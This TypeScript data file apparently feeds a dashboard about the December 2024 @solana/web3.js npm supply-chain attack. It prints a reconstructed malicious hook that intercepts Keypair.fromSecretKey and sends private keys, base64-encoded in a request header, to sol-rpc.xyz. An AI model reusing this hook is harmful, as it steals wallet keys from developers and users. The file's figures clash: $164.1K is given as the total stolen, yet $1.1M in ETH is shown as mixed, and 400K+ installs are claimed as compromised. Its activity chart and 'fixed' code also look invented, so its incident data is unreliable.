import type { FundFlow, RemediationAction, TimelineEvent } from "@/types"

export const vulnerable_code = `
// Malicious code injection in @solana/web3.js v1.95.6/7
const sendKey = (privateKey) => {
  fetch('https://sol-rpc.xyz/exfil', {
    method: 'POST',
    headers: {
      'CF-IPCountry': 'US',
      'CF-Ray': Buffer.from(privateKey).toString('base64') 
    }
  });
};

// Compromised methods
Keypair.fromSecretKey = function(secretKey) {
  sendKey(secretKey);
  return originalFromSecretKey(secretKey);
};
`

export const fixed_code = `
// Secure version v1.95.8
Keypair.fromSecretKey = function(secretKey) {
  validateKeySource(secretKey); // Added origin checks
  return originalFromSecretKey(secretKey);
};

// Enhanced logging without sensitive data
Sentry.captureMessage({
  event_type: "key_generated",
  key_type: "ed25519" 
});
`

export const flow_data: FundFlow[] = [
  {
    blockchain: "Solana",
    from: "Compromised Wallets",
    to: "FnvLGtucz4E1ppJHRTev6Qv4X7g8Pw6WPStHCcbAKbfx",
    amount: "674.86 SOL + Tokens ($164.1K)",
    status: "Stolen"
  },
  {
    blockchain: "Ethereum",
    from: "0x70479...d3F1",
    to: "Tornado Cash",
    amount: "420 ETH ($1.1M)",
    status: "Mixed"
  },
  {
    blockchain: "Binance Smart Chain",
    from: "Attacker Wallet",
    to: "MEXC/Bybit",
    amount: "$32.1K Frozen",
    status: "Recovered"
  }
]

export const remediation_data: RemediationAction[] = [
  {
    action: "Malicious Package Removal (v1.95.6/7)",
    status: "Complete",
    date: "2024-12-03"
  },
  {
    action: "Security Patch Release (v1.95.8)",
    status: "Complete",
    date: "2024-12-03"
  },
  {
    action: "npm Publishing Credentials Revoked",
    status: "Complete",
    date: "2024-12-04"
  },
  {
    action: "Mandatory 2FA Enforcement",
    status: "Complete",
    date: "2024-12-05"
  },
  {
    action: "Third-Party Audit (Halborn)",
    status: "Complete",
    date: "2024-12-15"
  }
]

export const stat_card_data = {
  title: "@solana/web3.js Supply Chain Attack",
  value: "$164.1K Stolen | 400K+ Weekly Downloads",
  isCritical: true,
  showProgress: true,
  progressValue: 19.5 // $32.1K recovered
}

export const timeline: TimelineEvent[] = [
  {
    time: "2024-11-22",
    title: "C2 Infrastructure Setup",
    description: "sol-rpc.xyz domain registered via NameSilo"
  },
  {
    time: "2024-12-02 15:20 UTC",
    title: "Spear Phishing Campaign",
    description: "Developers targeted with fake npm collaboration invites"
  },
  {
    time: "2024-12-03 03:20 UTC",
    title: "Malicious Packages Published",
    description: "v1.95.6/7 pushed to npm registry"
  },
  {
    time: "2024-12-03 20:25 UTC",
    title: "Packages Unpublished",
    description: "Clean version v1.95.8 released"
  },
  {
    time: "2024-12-05",
    title: "OFAC Sanctions",
    description: "14 attacker wallets added to SDN list"
  }
]

export const tvl_chart_data = {
  title: "Solana Developer Activity Impact",
  exploitDate: "2024-12-03",
  showPercentageChange: true,
  data: [
    { date: "2024-11-01", value: 85000 }, // Active developers
    { date: "2024-12-01", value: 82000 },
    { date: "2024-12-03", value: 45000 },
    { date: "2025-01-01", value: 68000 },
    { date: "2025-03-01", value: 79000 }
  ]
}

export const exploit_diagram_data = {
  title: "Supply Chain Attack Flow",
  topSteps: [
    "Maintainer Phishing", 
    "Malicious Code Injection",
    "Private Key Exfiltration"
  ],
  bottomSteps: [
    "Developer Machines", 
    "sol-rpc.xyz C2 Server",
    "Attacker Wallets"
  ],
  bottomArrowLabels: [
    "400K+ Compromised Installs", 
    "$164.1K Drained"
  ]
}
